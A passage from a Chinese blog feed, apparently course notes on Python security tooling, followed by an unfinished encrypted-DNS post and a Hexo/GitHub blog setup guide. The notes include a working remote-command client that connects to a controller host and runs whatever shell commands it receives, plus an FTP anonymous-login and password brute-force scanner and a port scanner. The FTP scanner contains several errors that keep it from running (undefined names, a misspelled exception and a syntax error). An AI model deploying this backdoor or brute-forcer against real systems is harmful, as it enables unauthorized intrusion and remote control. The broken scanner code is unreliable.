threading.Thread(target=wait_connect, args=(s,))    t.start()    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">if</span> len(clientList) &gt; <span class="hljs-number">0</span>:            select_client()            shell_ctrl(curClient[<span class="hljs-number">0</span>],curClient[<span class="hljs-number">1</span>])<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    main()</code></pre><p>被控端需要实现：1）连接控制端；2）执行控制端发送的命令；3）发送执行结果。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> threading<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connectHost</span><span class="hljs-params">(ht,pt)</span>:</span>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.connect((ht, int(pt)))    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        data = sock.recv(<span class="hljs-number">1024</span>)        data = data.decode(<span class="hljs-string">'utf-8'</span>)        comRst = subprocess.Popen(data, shell= <span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)        m_stdout, m_stderr = comRst.communicate()        sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode(<span class="hljs-string">'utf-8'</span>))        time.sleep(<span class="hljs-number">1</span>)    sock.close()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    parser = argparse.ArgumentParser()    parser.add_argument(<span class="hljs-string">'-H'</span>, dest=<span class="hljs-string">'hostName'</span>, help=<span class="hljs-string">'Host Name'</span>)    parser.add_argument(<span class="hljs-string">'-p'</span>, dest=<span class="hljs-string">'conPort'</span>, help=<span class="hljs-string">'Host Port'</span>)    args = parser.parse_args()    host = args.hostName    port = args.conPort    <span class="hljs-keyword">if</span> host == <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> port == <span class="hljs-literal">None</span>:        print(parser.parse_args([<span class="hljs-string">'-h'</span>]))        exit(<span class="hljs-number">0</span>)    connectHost(host, port)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    main()</code></pre><h2 id="第三课-实现FTP扫描器"><a href="#第三课-实现FTP扫描器" class="headerlink" title="第三课. 实现FTP扫描器"></a>第三课. 实现FTP扫描器</h2><p><strong>关键字</strong>：Ftplib</p><h3 id="一-基础知识-2"><a href="#一-基础知识-2" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>FTP服务器</strong>是在互联网上提供文件存储和访问的计算机，依照FTP协议（文件传输协议）提供服务。FTP仅基于TCP服务，不支持UDP，使用两个端口，一个数据端口（20，不定），一个命令端口（21）。FTP有两种工作模式：</p><ol><li>主动FTP，做静态映射时只开放21端口即可，它会用20端口和客户端主动发起连接。</li><li>被动FTP，服务器控制端口是21，数据端口是随机的，而且是客户端去连接相应的端口，仅做静态映射是不够的，需要DMZ。</li></ol><p><strong>FTP扫描</strong>主要从两个方面着手：1）扫描匿名FTP；2）扫描FTP弱口令。</p><p>FTP匿名登录主要应用于批量扫描。因为很多网站都开放FTP服务方便用户下载资源，而且有的网络管理员为了方便网站访问软件的更新也开放了FTP匿名登录。</p><p>FTP弱口令扫描依赖于用户名和密码字典，本质为暴力破解。</p><p><strong>pyftpdlib</strong>搭建FTP服务器。pip安装pyftpdlib后，按一下命令启动ftp服务器，默认允许匿名登录。<code>sudo python3 -m pyftpdlib -p 21</code></p><h3 id="二-具体实现-2"><a href="#二-具体实现-2" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><pre><code class="hljs python"><span class="hljs-keyword">from</span> ftplib <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> time<span class="hljs-comment">#匿名登录，直接使用python ftplib库中的FTP这个类</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anonScan</span><span class="hljs-params">(hostname)</span>:</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">with</span> FTP(hostname) <span class="hljs-keyword">as</span> ftp:            ftp.login()  <span class="hljs-comment">#不带参数，匿名的登录</span>            print(<span class="hljs-string">'\n[*]'</span> + str(hostname) + <span class="hljs-string">"FTP Anonymous login!"</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(<span class="hljs-string">'\n[-]'</span> + str(hostname) + <span class="hljs-string">'FTP Anonymous fail.'</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-comment">#弱口令扫描</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vlcLogin</span><span class="hljs-params">(hostname, pwdFile)</span>:</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">with</span> open(pwdFile,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> pf.readlines():                time.sleep(<span class="hljs-number">1</span>)                userName = line.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">0</span>]                passWord = line.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">1</span>].strip(<span class="hljs-string">'\r'</span>).strip(<span class="hljs-string">'\n'</span>)                print(<span class="hljs-string">'[+] Trying:'</span> + userName + <span class="hljs-string">':'</span> +password)                <span class="hljs-keyword">try</span>:                    <span class="hljs-keyword">with</span> FTP(hostname) <span class="hljs-keyword">as</span> ftp:                        ftp.login(userName, passWord)                        print(<span class="hljs-string">'\n[+]'</span> +str(hostname)+<span class="hljs-string">'FTP Login successful'</span>)                        <span class="hljs-keyword">return</span>(userName, passWord)                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">except</span> IOErros <span class="hljs-keyword">as</span> e:        print(<span class="hljs-string">'Error, the passwd file does not exist'</span>)    print(<span class="hljs-string">'\n[-] Cannot crack the FTP password'</span>)    <span class="hljs-keyword">return</span>(<span class="hljs-literal">None</span>,<span class="hljs-literal">None</span>) <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    parser = argparse.ArgumentParser(description=<span class="hljs-string">'FTP Scanner'</span>)    parser.add_argument(<span class="hljs-string">'-H'</span>,dest=<span class="hljs-string">'hostName'</span>,help=<span class="hljs-string">'The host list'</span>)    parsee.add_argument(<span class="hljs-string">'-f'</span>,dest=<span class="hljs-string">'pwdFile'</span>,help=<span class="hljs-string">'Password file'</span>)    options = <span class="hljs-literal">None</span>    <span class="hljs-keyword">try</span>:        options = parser.parse_args()    <span class="hljs-keyword">except</span>:        print(parser.parse_args([<span class="hljs-string">'-h'</span>]))        exit(<span class="hljs-number">0</span>)    hostNames = str(options.hostName).split(<span class="hljs-string">','</span>)    pwdFile = options.pwdFile    <span class="hljs-keyword">if</span> hostNames == [<span class="hljs-string">'None'</span>]:        print(parser.parse_args([<span class="hljs-string">'-h'</span>]))        exit(<span class="hljs-number">0</span>)    <span class="hljs-keyword">for</span> hostName <span class="hljs-keyword">in</span> hostNames:        username = <span class="hljs-literal">None</span>        password = <span class="hljs-literal">None</span>        <span class="hljs-keyword">if</span> anonScan(hostName) == <span class="hljs-literal">True</span>:            print(<span class="hljs-string">'Host'</span>: + hostName + <span class="hljs-string">'can login anonymously'</span>)        <span class="hljs-keyword">elif</span> pwdFile != <span class="hljs-literal">None</span>:            (username, password) = vlcLogin(hostName, pwdFile)            <span class="hljs-keyword">if</span> password != <span class="hljs-literal">None</span>:                print(<span class="hljs-string">'[+] Done:'</span> + userName + <span class="hljs-string">':'</span> +password)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    main()</code></pre><h2 id="第四课-Python端口扫描器"><a href="#第四课-Python端口扫描器" class="headerlink" title="第四课. Python端口扫描器"></a>第四课. Python端口扫描器</h2><p><strong>关键字</strong>：python-nmap包，_thread多线程</p><h3 id="一-基础知识-3"><a href="#一-基础知识-3" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>端口扫描</strong>，向客户端一定范围的服务器端口发送请求，探测服务器或主机端口开放情况，常用于计算机管理员确认安全策略或攻击者识别目标主机上的可运行的网络服务。主要用途还是确认远程机器上某个服务的可用性。</p><p><strong>端口清扫</strong>（Portsweep），向多个主机的某个端口发送请求。</p><p>常用扫描方式为：1）连接扫描；2）SYN扫描。</p><p><strong>连接扫描</strong>，使用TCP连接，利用操作系统原生的网络功能，通常作为SYN扫描的额替代选项。如果端口开放，操作系统可以完成TCP三次握手，然后扫描工具会关闭刚建立的连接，防止DoS。但是由于使用了原生系统的功能，我们无法进行底层控制，而且这种扫描方式容易被发现，且记录发送者IP。</p><p><strong>SYN扫描</strong>，自行生成、发送IP数据包，并监控其回应。此种方式不建立完整TCP连接，也被称为“半开放扫描“。扫描工具发送SYN包，如果端口开放则回复SYN-ACK包，此时扫描端回应RST包并在握手前关闭连接；如果端口没开放，则会返回RST包。这种方法劣势在于RST包可能会导致网络堵塞。</p><p><strong>python-nmap包</strong>，Nmap是一款用于网络发现和安全审计的网络安全工具</p><h3 id="二-具体实现-3"><a href="#二-具体实现-3" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><p>本次实现连接扫描方式。直接将目标地址和端口范围作为参数。<code>python3 port_scan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;</code></p><p>在基础功能的基础上，为提高性能，考虑采用多线程的方式。注意print的时候要加锁，不然多个输出可能混合在一起。锁需要在程序启动时创建，从而让新建线程共享。但这个程序中没有限制线程数，如果系统中线程过多会影响性能.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> _thread <span class="hljs-keyword">as</span> thread<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_test</span><span class="hljs-params">(port)</span>:</span>    sock = socket(AF_INET, SOCK_STREAM)    sock.settimeout(<span class="hljs-number">10</span>)    result = sock.connect_ex((target_ip, port))    <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:        lock.acquire()        print(<span class="hljs-string">'Opened port'</span>,port)        lock.release()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    host = sys.argv[<span class="hljs-number">1</span>]    portstrs = sys.argv[<span class="hljs-number">2</span>].split(<span class="hljs-string">'-'</span>)    start_port = int(portstrs[<span class="hljs-number">0</span>])    end_port = int(portstrs[<span class="hljs-number">1</span>])    target_ip = gethostbyname(host)    lock = thread.allocate_lock()    opened_ports = []<span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> range(start_port, end_port):    thread.start_new_thread(tcp_test,(port,))</code></pre><p>pythonl-nmap使用示例，详细使用多看文档。</p><pre><code class="hljs python"><span class="hljs-comment"># sudo apt-get install nmap python3-nmap</span><span class="hljs-keyword">import</span> nmapnm = nmap.PortScanner()nm.scan(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-string">'22-100'</span>)nm.command_line()nm.scaninfo()nm.all_hosts()</code></pre><p>此项目还可以加入其它改进：1）增加GUI进行手动添加扫描范围和主机；2）生成csv报告；3）后台扫描，报告以邮件形式发给管理员。</p><h2 id="第五课-密码强度检测"><a href="#第五课-密码强度检测" class="headerlink" title="第五课. 密码强度检测"></a>第五课. 密码强度检测</h2><p><strong>关键词</strong>：正则表达式，python库</p><p>面向API的编程方法——先设计API，再实现代码。本次课程实现一个可以给其它程序员使用的简单的库。</p><h3 id="一-基础知识-4"><a href="#一-基础知识-4" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>密码复杂度</strong>，长度，大小写字母，数字和特殊字符，密码包含的特征越多，强度越高。Github上已经有人建立了<a href="https://github.com/iryndin/10K-Most-Popular-Passwords" target="_blank" rel="noopener">常用密码表</a>。</p><p><strong>正则表达式</strong>，使用re模块的compile方法编译密码特生，之后调用search方法即可。</p><pre><code class="hljs python">NUMBER = re.compile(<span class="hljs-string">r'[0-9]'</span>)LOWER_CASE = re.compile(<span class="hljs-string">r'[a-z]'</span>)UPPER_CASE = re.compile(<span class="hljs-string">r'[A-Z]'</span>)OTHERS = re.compile(<span class="hljs-string">r'[^0-9a-zA-Z]'</span>)</code></pre><h3 id="二-具体实现-4"><a href="#二-具体实现-4" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><p>首先编写一个模块</p><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python3</span><span class="hljs-string">"""</span><span class="hljs-string">check</span><span class="hljs-string">~~~~~~~</span><span class="hljs-string">check if your password safe.</span><span class="hljs-string">"""</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> json__all__ = [<span class="hljs-string">'password'</span>]NUMBER = re.compile(<span class="hljs-string">r'[0-9]'</span>)LOWER_CASE = re.compile(<span class="hljs-string">r'[a-z]'</span>)UPPER_CASE = re.compile(<span class="hljs-string">r'[A-Z]'</span>)OTHERS = re.compile(<span class="hljs-string">r'[^0-9a-zA-Z]'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_common_password</span><span class="hljs-params">()</span>:</span>    words = []    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'10k_most_common.txt'</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> f.readlines():            words.append(word.strip().decode(encoding=<span class="hljs-string">'utf-8'</span>))    <span class="hljs-keyword">return</span> wordsCOMMON_WORDS = load_common_password()<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Strength</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, valid, strength,message)</span>:</span>        self.valid = valid         <span class="hljs-comment">#是否有效</span>        self.strength = strength   <span class="hljs-comment">#密码强度</span>        self.message = message     <span class="hljs-comment">#提示信息</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">return</span> self.strength    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">return</span> self.message    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bool__</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">return</span> self.valid<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Password</span>:</span>    TERRIBLE = <span class="hljs-number">0</span>    SIMPLE = <span class="hljs-number">0</span>    MEDIUM = <span class="hljs-number">2</span>    STRONG = <span class="hljs-number">3</span>    <span class="hljs-meta">    @staticmethod</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_regular</span><span class="hljs-params">(input)</span>:</span>  <span class="hljs-comment">#判定是否是按键盘顺序的密码</span>        reverse = input[::<span class="hljs-number">-1</span>]        regular = <span class="hljs-string">''</span>.join([<span class="hljs-string">'qwertyuio'</span>,<span class="hljs-string">'asdfghjkl'</span>,<span class="hljs-string">'zxcvbnm'</span>])        <span class="hljs-keyword">return</span> input <span class="hljs-keyword">in</span> regular <span class="hljs-keyword">or</span> reverse <span class="hljs-keyword">in</span> regular<span class="hljs-meta">    @staticmethod</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_by_step</span><span class="hljs-params">(input)</span>:</span> <span class="hljs-comment">#是否按照ASCII等差数列</span>        delta = ord(input[<span class="hljs-number">1</span>]) - ord(input[<span class="hljs-number">0</span>])        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,len(input)):            <span class="hljs-keyword">if</span> ord(input[i]) - ord(input[i<span class="hljs-number">-1</span>]) != delta:                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><span class="hljs-meta">    @staticmethod</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_common</span><span class="hljs-params">(input)</span>:</span>        <span class="hljs-keyword">return</span> input <span class="hljs-keyword">in</span> COMMON_WORDS        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span><span class="hljs-params">(self,input,min_length=<span class="hljs-number">6</span>,min_types=<span class="hljs-number">3</span>,level=STRONG)</span>:</span>        <span class="hljs-keyword">if</span> len(input) &lt; min_length:            <span class="hljs-keyword">return</span> Strength(<span class="hljs-literal">False</span>, <span class="hljs-string">'terrible'</span>,<span class="hljs-string">'密码太短'</span>)        <span class="hljs-keyword">if</span> self.is_regular(input) <span class="hljs-keyword">or</span> self.is_by_step(input):            <span class="hljs-keyword">return</span> Strength(<span class="hljs-literal">False</span>, <span class="hljs-string">'simple'</span>, <span class="hljs-string">'密码有规则'</span>)        <span class="hljs-keyword">if</span> self.is_common(input):            <span class="hljs-keyword">return</span> Strength(<span class="hljs-literal">False</span>,<span class="hljs-string">'simple'</span>,<span class="hljs-string">'密码很常见'</span>)        types = <span class="hljs-number">0</span>        <span class="hljs-keyword">if</span> NUMBER.search(input):            types += <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> LOWER_CASE.search(input):            types += <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> UPPER_CASE.search(input):            types +=<span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> OTHERS.search(input):            types +=<span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> types &lt; <span class="hljs-number">2</span>:            <span class="hljs-keyword">return</span> Strength(level &lt;= self.SIMPLE, <span class="hljs-string">'simple'</span>,<span class="hljs-string">'密码太简单'</span>)        <span class="hljs-keyword">if</span> types &lt; min_types:            <span class="hljs-keyword">return</span> Strength(level &lt;= self.MEDIUM, )</code></pre>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>课程笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加密DNS协议相关内容</title>
    <link href="/2020/06/01/encry-dns/"/>
    <url>/2020/06/01/encry-dns/</url>
    
    <content type="html"><![CDATA[<p>加密DNS协议如DNS over HTTPS，DNS over TLS以提出很长一段时间，越来越多公司开始部署支持。本文检索当前针对加密DNS协议的相关研究，梳理研究内容，提出未来方向。</p><h3 id="一-背景"><a href="#一-背景" class="headerlink" title="一. 背景"></a>一. 背景</h3><h3 id="二-相关工作"><a href="#二-相关工作" class="headerlink" title="二. 相关工作"></a>二. 相关工作</h3><h3 id="三-科研想法"><a href="#三-科研想法" class="headerlink" title="三. 科研想法"></a>三. 科研想法</h3>]]></content>
    
    
    <categories>
      
      <category>DNS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>这个博客的搭建过程</title>
    <link href="/2020/06/01/build-blog/"/>
    <url>/2020/06/01/build-blog/</url>
    
    <content type="html"><![CDATA[<p>本文重点介绍基于Hexo+Github搭建个人网站流程，最初基本源自<a href="https://mp.weixin.qq.com/s/sXH031TVK8-ZVG4KLVYyog" target="_blank" rel="noopener">这篇文章</a>（如何使用Github从零开始搭建一个博客），作者把步骤已经介绍得非常详细完善了。我只是补充踩到的一些坑….</p><p>后来，我背弃了极简审美，开始使用<strong>Fluid</strong>主题。</p><h3 id="一-基础搭建"><a href="#一-基础搭建" class="headerlink" title="一. 基础搭建"></a>一. 基础搭建</h3><p>搭建过程使用的两个最基本、最重要的东西是Hexo和Github，其中前者是一个轻量级博客框架，支持将Markdown编写的文章直接编译为静态网页文件并发布，省去了数据库问题。Github则用来解决域名问题，其Github Pages允许每个用户创建一个名为{username}.github.io的仓库，发布博客网页。当然也可以自己申请域名，使用CNAME跳转。</p><h4 id="1-Github创建仓库"><a href="#1-Github创建仓库" class="headerlink" title="1. Github创建仓库"></a>1. Github创建仓库</h4><p>在Github上创建一个名为{username}.github.io的仓库，注意必须是github.io结尾。比如我的github账户为“DeepDeer”，创建仓库为“deepdeer.github.io”。另外，申请对应仓库时不要弄成private的，否则开放博客Github要收费哈。</p><h4 id="2-安装环境"><a href="#2-安装环境" class="headerlink" title="2. 安装环境"></a>2. 安装环境</h4><p>首先在自己电脑上安装Node.js，确保环境变量配置好，可以使用npm命令；</p><p>其次使用npm命令安装Hexo，安装后确保可以使用<code>hexo</code>命令。</p><pre><code class="hljs bash">npm install -g hexo-cli</code></pre><h4 id="3-初始化项目"><a href="#3-初始化项目" class="headerlink" title="3. 初始化项目"></a>3. 初始化项目</h4><p>选定存储博客文件的位置，在此文件夹中使用如下命令创建项目及对应文件夹：</p><pre><code class="hljs bash">hexo init &#123;name&#125;</code></pre><p>命令下产生的文件夹包括themes、source等文件夹，调用如下命令，则在public文件夹中生成js、css、font等内容。</p><pre><code class="hljs verilog">hexo <span class="hljs-keyword">generate</span></code></pre><p>使用server命令在本地运行博客，可以看到类似结果：</p><pre><code class="hljs routeros">hexo<span class="hljs-built_in"> server </span> #或简写为 hexo s</code></pre><div align="center">  <img src="/2020/06/01/build-blog/hello.jpg" srcset="/img/loading.gif" width="70%" height="70%" alt="oauth"></div><div align="center">  <img src="/2020/06/01/build-blog/hexo.jpg" srcset="/img/loading.gif" width="70%" height="70%" alt="oauth"></div><h4 id="4-部署至Github"><a href="#4-部署至Github" class="headerlink" title="4. 部署至Github"></a>4. 部署至Github</h4><p>安装一个支持Git的部署插件</p><pre><code class="hljs sql">npm <span class="hljs-keyword">install</span> hexo-deployer-git <span class="hljs-comment">--save</span></code></pre><p>修改Hexo的配置文件_config.yml，找到Deployment部分，修改为如下内容：</p><pre><code class="hljs bash"><span class="hljs-comment"># Deployment</span><span class="hljs-comment">## Docs: https://hexo.io/docs/deployment.html</span>deploy:  <span class="hljs-built_in">type</span>: git  repo: git@github.com:DeepDeer/deepdeer.github.io <span class="hljs-comment">#你自己的Github仓库地址</span>  branch: master</code></pre><p>使用deploy命令部署后，可通过域名deepdeer.github.io访问，Github上传代码如下：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo deploy</span></code></pre><div align="center">  <img src="/2020/06/01/build-blog/github.jpg" srcset="/img/loading.gif" width="70%" height="70%" alt="oauth"></div><p>可编写如下内容脚本deploy.sh，此后每当有内容更新时，<code>.deploy.sh</code>运行脚本即可。</p><pre><code class="hljs bash">hexo cleanhexo generatehexo deploy</code></pre><h3 id="二-加入主题"><a href="#二-加入主题" class="headerlink" title="二.  加入主题"></a>二.  加入主题</h3><p>目前我加入的是Fluid主题（因为看上了颜值），之前用过一段时间Next主题，也很推荐。</p><h4 id="1-Next主题"><a href="#1-Next主题" class="headerlink" title="1. Next主题"></a>1. Next主题</h4><p>有关Next主题的配置及各种插件，在<a href="https://mp.weixin.qq.com/s/sXH031TVK8-ZVG4KLVYyog" target="_blank" rel="noopener">这篇文章</a>中介绍地非常详细，这里只补充有关1）添加Gitalk插件和2）修改字体部分。</p><h5 id="1-gt-Gitalk插件"><a href="#1-gt-Gitalk插件" class="headerlink" title="1&gt; Gitalk插件"></a>1&gt; Gitalk插件</h5><p>申请Gitalk就在Github个人账户的settings——&gt; Developer settings ——&gt; OAuth Apps，点击 New OAuth App，出现申请界面。其中应用名称随便写就行，Hompage URL和Authorization callback URL写博客链接。如果有自己的域名可以更改Authorization callback URL。点击注册，生成Client ID和Client Secret。</p><p>注意，如果自己配置了域名，这个callback URL要改成自定义域名</p><div align="center">  <img src="/2020/06/01/build-blog/oauth.jpg" srcset="/img/loading.gif" width="40%" height="40%" alt="oauth"></div><p>在配置了_config.yml文件后，第一次进入界面会出现下图效果。如果点击Github登录后跳转到了404界面，那么, 就说明配错了。我当时是在写_config.yml忘了把client_id, client_secret字段带的{ }去掉。这给我一顿google啊…</p><div align="center">  <img src="/2020/06/01/build-blog/begin.jpg" srcset="/img/loading.gif" width="30%" height="30%" alt="oauth"></div><p>最后效果就像这个博客里一样，相关评论会显示在对应仓库的issues里，记得在仓库的settings里把features—&gt;issues勾选上（貌似默认就是开启的）</p><div align="center">  <img src="/2020/06/01/build-blog/comment.jpg" srcset="/img/loading.gif" width="70%" height="70%" alt="oauth"></div><div align="center">  <img src="/2020/06/01/build-blog/issues.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div><h5 id="2-gt-修改字体"><a href="#2-gt-修改字体" class="headerlink" title="2&gt; 修改字体"></a>2&gt; 修改字体</h5><p>Next主题默认的博文正文字体大小有点大了，可以在配置文件里改一下。相关配置在hexo\themes\next\source\css\variables路径下的base.styl文件里的Font Size部分。这里面每个变量控制某一部分的字体大小，我是挨个试出来的font-size-large是正文字体（简单粗暴，真开心…)</p><div align="center">  <img src="/2020/06/01/build-blog/font.jpg" srcset="/img/loading.gif" width="50%" height="50%" alt="oauth"></div><p>另外，在Hexo配置文件和Next主题配置文件中，都有一些有关网站信息的配置选项，最终使用Next主题搭建出的网站效果如下：</p><div align="center">  <img src="/2020/06/01/build-blog/next.jpg" srcset="/img/loading.gif" width="70%" height="50%" alt="oauth"></div><h4 id="2-Fluid主题"><a href="#2-Fluid主题" class="headerlink" title="2.Fluid主题"></a>2.Fluid主题</h4><p>其实这个主题有非常好的<a href="https://fluid-dev.github.io/hexo-fluid-docs/guide/" target="_blank" rel="noopener">配置指南</a>，其配置文件_config.yml的注释也很清晰，可以从头摸索。有几点经验包括1）图片插入；2）评论插件。</p><h5 id="1-gt-图片插入"><a href="#1-gt-图片插入" class="headerlink" title="1&gt; 图片插入"></a>1&gt; 图片插入</h5><p>需要注意的一点是，在Fluid主题下有文章背景图等存在于框架中的图片，这些图片一律存放在<code>./themes/fluid/source/img</code>文件夹下。即使是某个文章的缩略图也是这样。</p><div align="center">  <img src="/2020/06/01/build-blog/pic.jpg" srcset="/img/loading.gif" width="30%" height="30%" alt="oauth"></div><p>其他存在于文章中的图片，可用如下形式添加。</p><p>首先，把_config.yml文件里的post_asset_folder选项设置为true。</p><p>其次安装一个插件，据说原有插件有一些bug，下面是修改过的插件，亲测有效，感谢<a href="https://www.jianshu.com/p/3db6a61d3782" target="_blank" rel="noopener">这篇博客</a></p><pre><code class="hljs vim">npm install http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/<span class="hljs-number">7</span>ym0n/hexo-asset-image --<span class="hljs-keyword">sa</span></code></pre><p>有了这些配置后，再运行hexo new xxx，在/source/_posts/路径下，除了可以生成新文章xxx.md之外，还生成一个同名文件夹。插入图片时放到这个文件夹里即可，在markdown里用如下语句：</p><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">"xxx/图片名称.png"</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">"图片标识"</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">"zoom:30%;"</span> /&gt;</code></pre><p>但是，在Fluid主题下，这些图片并没有默认居中，可以采用如下HTML代码控制位置和大小：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"build-blog/pic.jpg"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"30%"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"30%"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"oauth"</span>  /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre><h5 id="2-gt-评论插件"><a href="#2-gt-评论插件" class="headerlink" title="2&gt;评论插件"></a>2&gt;评论插件</h5><p>Fluid推荐的utteranc.es插件，经常会有加载比较慢的问题，乍一看以为不让评论…</p><p>这个配置过程也很简单。</p><p>首先在github创建一个公开的仓库，比如命名为’deepdeer_comments’。</p><p>点击<a href="https://github.com/apps/utterances" target="_blank" rel="noopener">这个链接</a>安装应用，选择“only select repositories”选项，找到刚刚建立好的仓库，点击install。</p><p>在配置中填写repo名，格式为“用户名/仓库名”，如“DeepDeer/deepdeer_comments”。Issue的命名方式建议选择第一个“Issue title contains page pathname”。</p><p>根据个人喜好选择主题之后，最后一栏会自动生成配置信息，复制这些信息。</p><p>在fluid主题的配置文件中，找到<code>comments</code>部分，将enable设置为true，并将type写成utterances。</p><p>在后面的comments具体配置部分，改成之前自动生成的配置。</p><div align="center">  <img src="/2020/06/01/build-blog/utter.jpg" srcset="/img/loading.gif" width="70%" height="70%" alt="oauth"></div><p>这个博客目前用的是Gitalk插件，配置与Next主题中提到的大致相同。Fluid代码中该插件配置有问题，评论无法分页显示，感谢<a href="https://juejin.im/post/5ed177e36fb9a047923a39fe" target="_blank" rel="noopener">这篇文章</a>。即更改fluid主题下的<code>layout/_partial/comments/gitalk.ejs</code>文件内容中的’id’一栏部分</p><pre><code class="hljs python"><span class="hljs-comment">#原有的</span>id: <span class="hljs-string">'&lt;%- md5(theme.gitalk.id) %&gt;'</span>,<span class="hljs-comment">#改正后</span>id: &lt;%- theme.gitalk.id %&gt;,</code></pre><h3 id="三-自定义域名"><a href="#三-自定义域名" class="headerlink" title="三. 自定义域名"></a>三. 自定义域名</h3><p>本博客使用了阿里云上购买的域名。</p><p>在<a href="https://wanwang.aliyun.com/domain/searchresult/?keyword=skylasun&suffix=.cn#/?keyword=skylasun&suffix=cn" target="_blank" rel="noopener">这里</a>点击“控制台”，登录后，找到边栏中的“域名”。选择“域名注册”</p><div align="center">  <img 